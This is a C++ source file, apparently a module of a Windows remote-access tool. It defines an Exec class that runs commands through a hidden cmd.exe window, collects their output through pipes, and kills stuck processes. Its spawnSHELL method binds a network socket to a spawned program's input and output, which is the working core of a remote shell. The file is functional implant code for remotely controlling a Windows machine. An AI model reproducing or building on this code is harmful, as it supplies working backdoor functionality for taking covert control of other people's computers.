#define _WIN32_WINNT  0x0600 //https://stackoverflow.com/questions/15111799/what-is-win32-winnt-and-how-does-it-work

#include "../inc/Exec.h"
#include "../inc/common.h"
#include <tlhelp32.h> 
#include <iostream> 
#include <windows.h>
#include <string>
#include <winsock2.h> 

using namespace std;

Exec::Exec()
{
    ;
}

vector<DWORD> Exec::returnPid(string stringTargetProcessName)
{
    cout << "name Proc>" <<  stringTargetProcessName << endl;
    wstring targetProcessName(stringTargetProcessName.begin(), stringTargetProcessName.end());
    
    vector<DWORD> pids; //stock all pid in vector.
    
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); //all processes

    PROCESSENTRY32W entry; 
    entry.dwSize = sizeof entry;

    if (!Process32FirstW(snap, &entry)) 
    { //start with the first in snapshot
        wcout << "ERROR" << endl;
    }

    do 
    {
       // wcout << entry.szExeFile << endl;
        if (wstring(entry.szExeFile) == targetProcessName) 
        {
            pids.push_back(entry.th32ProcessID); //name matches; add to list
            wcout << "RESULT: " <<entry.th32ProcessID << endl;
        }
    } while (Process32NextW(snap, &entry)); //keep going until end of snapshot

    return pids;
}
void Exec::setupAllPipe()
{
    SECURITY_ATTRIBUTES sa; 
    printf("\n->Start of parent execution.\n");
    // Réglez le drapeau bInheritHandle pour que les poignées de pipe soient héritées. 
    sa.nLength = sizeof(SECURITY_ATTRIBUTES); 
    sa.bInheritHandle = TRUE; 
    sa.lpSecurityDescriptor = NULL; 
    
    // Créer un tuyau pour le STDERR du processus enfant.  | Crée un tube anonyme et renvoie des poignées aux extrémités de lecture et d'écriture du tube.
    // cout << "GO PIPE " << endl;
    if(!CreatePipe(&a_hChildStd_ERR_Rd, &a_hChildStd_ERR_Wr, &sa, 0)) 
    {
        cout <<" NO CREATE PIPE" << endl;
        a_error = TRUE;
    //    exit(1); 
    }
     // Veiller à ce que la poignée de lecture du tuyau pour le STDERR ne soit pas héritée.
    if(!SetHandleInformation(a_hChildStd_ERR_Rd, HANDLE_FLAG_INHERIT, 0))
    {
        cout << "NOT ERIRTER  WALA" << endl;
        a_error = TRUE;
       // exit(1);
    }
     // Créer un tuyau pour le processus de l'enfant STDOUT. | Crée un tube anonyme et renvoie des poignées aux extrémités de lecture et d'écriture du tube.
    if(!CreatePipe(&a_hChildStd_OUT_Rd, &a_hChildStd_OUT_Wr, &sa, 0) ) 
    {
        cout <<" NO CREATE PIPE" << endl;
        a_error = TRUE;
        //exit(1);
    }
      // S'assurer que la poignée de lecture du tuyau pour STDOUT n'est pas héritée
    if(!SetHandleInformation(a_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0))
    {
        cout << "NOT ERIRTER  WALA" << endl;
        a_error = TRUE;
        //exit(1); 
    }
    // Créer le processus de l'enfant.  

    // Les poignées ouvertes restantes sont nettoyées à la fin de ce processus. 
    // Pour éviter les fuites de ressources dans une application plus importante, 
    // fermer les poignées explicitement.
}

PROCESS_INFORMATION Exec::createChildProcess(string &command)
{
    // Définir le texte que je veux exécuter
    string command_C = "/C " + command ;
    
    char *argv_cmd = &command_C[0]; //arguments
    PROCESS_INFORMATION piProcInfo; 
    STARTUPINFOA siStartInfo;
    bool bSuccess = FALSE; 

    // Mettre en place les membres de la structure PROCESS_INFORMATION. 
    ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION)); 
    // Mettre en place les membres de la structure STARTUPINFO. 
    // Cette structure spécifie les gestionnaires STDERR et STDOUT pour la redirection.
    ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
    siStartInfo.cb = sizeof(STARTUPINFO); 
    siStartInfo.hStdError = a_hChildStd_ERR_Wr;
    siStartInfo.hStdOutput = a_hChildStd_OUT_Wr;
    siStartInfo.dwFlags |= STARTF_USESTDHANDLES; //Les membres hStdInput , hStdOutput et hStdError contiennent des informations supplémentaires. Si cet indicateur est spécifié lors de l'appel de l'une des fonctions de création de processus, les handles doivent être héritables et le paramètre bInheritHandles de la fonction doit être défini sur TRUE. Pour plus d'informations, consultez Gérer l'héritage .
   
   // Créer le processus de l'enfant. 
    bSuccess = CreateProcessA("C:\\windows\\system32\\cmd.exe",  //command line 
        argv_cmd,     // argv of cmd
        NULL,          // process security attributes 
        NULL,          // primary thread security attributes 
        TRUE,          // handles are inherited 
        CREATE_NO_WINDOW,             // creation flags 
        NULL,          // use parent's environment 
        NULL,          // use parent's current directory 
        &siStartInfo,  // STARTUPINFO pointer 
        &piProcInfo);  // receives PROCESS_INFORMATION
    
    cout << "process childen id:  " <<  GetProcessId(piProcInfo.hProcess) << endl; 
   
    BOOL statusObject = WaitForSingleObject(piProcInfo.hProcess, TIMEOUT_CREATE_PROC);

    if(statusObject == WAIT_TIMEOUT)
    {
        cout << "\r\rTIMEOUT!!!!"<< endl;
        a_timeout = TRUE;
    }

    CloseHandle(a_hChildStd_ERR_Wr);
    CloseHandle(a_hChildStd_OUT_Wr);
    
    CloseHandle(piProcInfo.hProcess);
    CloseHandle(piProcInfo.hThread);
    cout << "CLOSEEEED" << endl;
    // If an error occurs, exit the application. 
    if (!bSuccess)
    {
        cout << "Failed create process " << endl;
        a_error = TRUE;
        //exit(1);
    }
    return piProcInfo;
}

string Exec::readFromPipe(PROCESS_INFORMATION piProcInfo)
{
    int BUFSIZE = 4096; //TEMP

    DWORD dwRead; 
    CHAR chBuf[BUFSIZE];


    cout << "Read from pipe " << endl;
    cout << "Current process2: " <<  GetCurrentProcessId() << endl;

    string out,err;

    while(true)
    {
        if(!ReadFile(a_hChildStd_OUT_Rd, chBuf, BUFSIZE,&dwRead,NULL))
        {
            //cout << "Error in read pipe childen out" << endl;
            break;
        }
        // Check for EOF reached
        if(dwRead == 0)
        {
            //cout << "OEF FIND !!" << endl;
            break;
        }
        cout <<"Size: " <<dwRead << endl;
        cout << "BUFFER:" <<strlen(chBuf) << endl;

        string s(chBuf, dwRead);
        out += s;

        memset(chBuf, 0, sizeof(chBuf)); //clean buffer
    }
    memset(chBuf, 0, sizeof(chBuf)); //clean buffer
   
    while (true)
    {
        if(!ReadFile(a_hChildStd_ERR_Rd, chBuf, BUFSIZE,&dwRead,NULL))
        {
            //cout << "Error in read pipe childen out " << endl;
            break;
        }
        // Check for EOF reached
        if(dwRead == 0)
        {
            //cout << "OEF FIND !!" << endl;
            break;
        }

        cout << dwRead << endl;
        string s(chBuf, dwRead);
        err += s;
        
        memset(chBuf, 0, sizeof(chBuf)); //clean buffer
    }
    
    if(err.empty()) 
    {
        return out;
    }
    else
    {
        return err;
    }
}

string Exec::executeCommand(string command)
{
    string result_of_command;

    setupAllPipe();
    PROCESS_INFORMATION piProcInfo = createChildProcess(command);
    
    if(a_error)
    {
        cout << "[+] One or more errors were detected. " << endl; //Go popen ?
        return (string) "[-] FATAL ERROR.";
    }
    else
    {
        cout <<"OUT size: " <<GetFileSize(a_hChildStd_OUT_Rd,NULL) << endl;
        cout << "ERR size: " << GetFileSize(a_hChildStd_ERR_Rd,NULL) << endl;
        if((GetFileSize(a_hChildStd_OUT_Rd,NULL) == 0) && (GetFileSize(a_hChildStd_ERR_Rd,NULL) == 0)) //error no read in pipes. | if timeout or pipe_err and pipe_our is empty.
        {
            result_of_command = "The command was executed successfully but no data was returned.";
            //If the size of stdout and stderr are = 0 it doesn't mean that there must be an error.
        }
        else if(a_timeout) //If the command has passed the timeout then don't read the pipes and try to kill the process that is causing the problem. 
        {
            //test if the process is stuck:
            cout << "in a_timeout: " << endl;
            vector<DWORD> pids = returnPid((command.substr(0, command.find(" ")))+".exe"); //list all pid
            
            if(!pids.empty()) //if the number of pid found is different from 0 then it means that there are several times the same process
            {
                for(int i=0;i <pids.size(); i++)
                {
                    HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pids[i]);
                    TerminateProcess(proc, 1);
                    CloseHandle(proc);
                    
                    cout << "[+] Process: " << pids[i] << " killed" << endl;
                }
                result_of_command = "[-] TIMEOUT IN CREATEPROCESS, but all the processes in the name of: " + (command+".exe") + "we were well and truly killed.";
            }
            else
            {
                cout << "pids empty" << endl;
                //esult_of_command = "[-] TIMEOUT IN CREATEPROCESS, but no process was killed.";
                result_of_command = readFromPipe(piProcInfo);
            }
        }
        else
        {result_of_command = readFromPipe(piProcInfo);}

        //Finally return result_of_command
        cout << "RESULT:  " << result_of_command << endl;
        return result_of_command; 
    }
}

void Exec::spawnSHELL(int sock, wchar_t *prog)
{
    cout << "IN METHOD" << endl;

    STARTUPINFOW siStartInfo;
    PROCESS_INFORMATION piProcInfo;
    
    ZeroMemory(&siStartInfo, sizeof(siStartInfo)); //Remplit un bloc de mémoire avec des zéros.
    ZeroMemory(&piProcInfo, sizeof(piProcInfo));

    siStartInfo.cb = sizeof(siStartInfo);

    siStartInfo.dwFlags = STARTF_USESTDHANDLES; //| STARTF_USESHOWWINDOW) ; //for hStdInput, hStdOutput, hStdError

    siStartInfo.hStdInput = (HANDLE)sock;
    siStartInfo.hStdOutput = (HANDLE)sock;
    siStartInfo.hStdError = (HANDLE)sock;
   // siStartInfo.wShowWindow = SW_HIDE;

    cout <<"GO" << endl;
    CreateProcessW(NULL,  //command line 
        prog,     // argv of cmd
        NULL,          // process security attributes 
        NULL,          // primary thread security attributes 
        TRUE,          // handles are inherited 
        0,             // creation flags 
        NULL,          // use parent's environment 
        NULL,          // use parent's current directory 
        &siStartInfo,  // STARTUPINFO pointer 
        &piProcInfo);  // receives PROCESS_INFORMATION
    cout << "Wait.." << endl;
    cout << GetLastError() << endl;
    WaitForSingleObject(piProcInfo.hProcess, INFINITE);
    CloseHandle(piProcInfo.hProcess);
    CloseHandle(piProcInfo.hThread);
    cout << "Close all Handle" << endl;
}

Exec::~Exec()
{

    CloseHandle(a_hChildStd_OUT_Rd);
    CloseHandle(a_hChildStd_ERR_Rd);
}

